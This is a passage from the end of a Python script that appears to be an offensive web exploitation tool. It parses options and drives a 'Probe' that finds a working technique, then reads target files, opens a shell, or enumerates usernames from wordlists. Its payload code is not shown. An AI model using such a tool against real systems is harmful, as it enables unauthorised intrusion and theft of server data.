    g = ap.add_argument_group("output")
    g.add_argument("-v", "--verbose", action="store_true", help="show every request")
    g.add_argument("--json", metavar="FILE", help="write hits as JSON")
    g.add_argument("--no-color", action="store_true")
    a = ap.parse_args()

    if not a.url and not a.request:
        ap.error("need -u URL or -r REQUEST_FILE")
    if a.url and not a.url.startswith(("http://", "https://")):
        a.url = "http://" + a.url
    if a.no_color:
        Style.on = False
    # assemble usernames: --user (repeatable + comma-separated) and --user-file (one per line)
    raw_users = list(a.user or [])
    if a.user_file:
        raw_users += [l for l in open(a.user_file, encoding="utf-8", errors="replace")
                      if l.strip() and not l.lstrip().startswith("#")]
    users = [u.strip() for chunk in raw_users for u in chunk.split(",") if u.strip()]
    seen = set()
    a.user = [u for u in users if not (u in seen or seen.add(u))] or None   # dedupe, keep order
    if a.user_wordlist and not a.user:
        ap.error("--user-wordlist needs at least one --user / --user-file")

    if a.user and a.raw:
        ap.error("--user enumerates after a find; it can't combine with --raw (use --read with explicit paths)")
    do_read = a.read or a.shell or a.user
    if do_read and not a.raw:
        a.first = a.first or not (a.read or a.user or a.json)   # reading needs one working technique; enum wants more

    p = Probe(a)
    try:
        if a.raw:
            p.reader(a.read, a.shell)
        elif p.find() and do_read:
            p.reader(a.read, a.shell)
    except KeyboardInterrupt:
        print("\n  interrupted")
        sys.exit(130)


if __name__ == "__main__":
    main()
